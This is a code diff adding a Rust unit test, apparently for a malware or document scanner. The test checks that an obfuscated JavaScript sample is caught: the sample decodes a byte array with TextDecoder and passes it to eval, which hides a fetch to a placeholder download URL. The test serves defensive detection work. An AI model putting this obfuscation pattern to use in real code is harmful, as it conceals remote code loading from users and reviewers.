@@ -14149,6 +14149,32 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_window_bracket_textdecoder_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://window-bracket-textdecoder-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new window["TextDecoder"]().decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://window-bracket-textdecoder-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS window[\"TextDecoder\"] Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_non_utf8_encoding_arg_does_not_decode_ascii_bytes() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-non-utf8-js.example/p')";
